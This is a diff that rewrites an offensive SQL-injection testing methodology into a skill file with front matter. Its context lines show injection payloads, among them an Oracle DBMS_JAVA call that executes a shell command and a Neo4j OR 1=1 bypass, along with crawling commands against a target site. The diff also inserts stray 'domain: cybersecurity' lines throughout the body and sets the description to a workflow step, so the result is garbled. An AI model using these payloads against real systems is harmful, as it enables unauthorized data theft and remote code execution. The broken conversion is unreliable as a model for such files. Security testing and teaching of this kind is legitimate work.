@@ -1,15 +1,8 @@
-# SQL Injection — Offensive Testing Methodology
-
-## Quick Workflow
-
-1. Map all input vectors that reach the database (URL params, POST body, cookies, headers, API filters, WebSocket messages)
-2. Insert probe payloads to detect classic SQLi; fall back to inferential (boolean/time-based) if no visible error
-3. Identify database type and enumerate schema
-4. Exploit to extract data, escalate privileges, or achieve RCE where in scope
-5. Document findings and suggest remediation
-
 ---
-
+name: offensive-sqli
+description: 1. Map all input vectors that reach the database (URL params, POST body, cookies, headers, API filters, WebSocket messages)
+domain: cybersecurity
+---
 ## Detection
 
 ### Basic Probes — All Input Vectors
@@ -88,7 +81,6 @@ POST /api/users/search
 ```
 
 ---
-
 ## Automation Workflow
 
 ```bash
@@ -112,8 +104,8 @@ hakrawler -url https://target.com | tee crawl
 arjun -i crawl -oJ params.json
 ```
 
+domain: cybersecurity
 ---
-
 ## Exploitation
 
 ### Determine Column Count (UNION)
@@ -158,7 +150,6 @@ arjun -i crawl -oJ params.json
 ```
 
 ---
-
 ## Database-Specific Exploitation
 
 ### MySQL / MariaDB
@@ -213,8 +204,8 @@ arjun -i crawl -oJ params.json
 ' BEGIN DBMS_JAVA.RUNJAVA('java.lang.Runtime.getRuntime().exec(''cmd.exe /c dir'')'); END; --
 ```
 
+domain: cybersecurity
 ---
-
 ## NoSQL & Graph Injection
 
 ### MongoDB
@@ -238,7 +229,6 @@ MATCH (u:User) WHERE u.name = 'admin' OR 1=1 //--' RETURN u
 Older Neo4j 5.x (<5.18 / <4.4.26) allowed privilege escalation via IMMUTABLE procedures.
 
 ---
-
 ## WAF Bypass Techniques
 
 | Technique | Example |
@@ -257,8 +247,8 @@ Older Neo4j 5.x (<5.18 / <4.4.26) allowed privilege escalation via IMMUTABLE pro
 
 **HTTP/2 smuggling:** Replay payloads over h2/h2c; HPACK compression can obscure payloads from perimeter WAFs.
 
+domain: cybersecurity
 ---
-
 ## Cloud-Specific Attack Paths
 
 ### AWS
@@ -299,7 +289,6 @@ exports.handler = async (event) => {
 ```
 
 ---
-
 ## ORM CVE Tracking (2023–2025)
 
 | ORM | CVE / Issue | Vulnerable Pattern |
@@ -320,8 +309,8 @@ await prisma.$queryRaw`SELECT * FROM users WHERE name = ${user}`
 knex('users').whereRaw('name = ?', [user])
 ```
 
+domain: cybersecurity
 ---
-
 ## Quick-Reference Cheatsheet
 
 | DB | Version | Time Delay | String Concat | Schema Source |
@@ -332,7 +321,6 @@ knex('users').whereRaw('name = ?', [user])
 | Oracle | `banner FROM v$version` | `DBMS_PIPE.RECEIVE_MESSAGE('RDS',5)` | `'a'\|\|'b'` | `all_tables`, `all_tab_columns` |
 
 ---
-
 ## Detection & Monitoring Queries
 
 **Splunk:**
@@ -354,8 +342,8 @@ fields @timestamp, @message
 | stats count() by bin(5m)
 ```
 
+domain: cybersecurity
 ---
-
 ## Key References
 
 - MITRE ATT&CK: T1190 (Exploit Public-Facing Application)
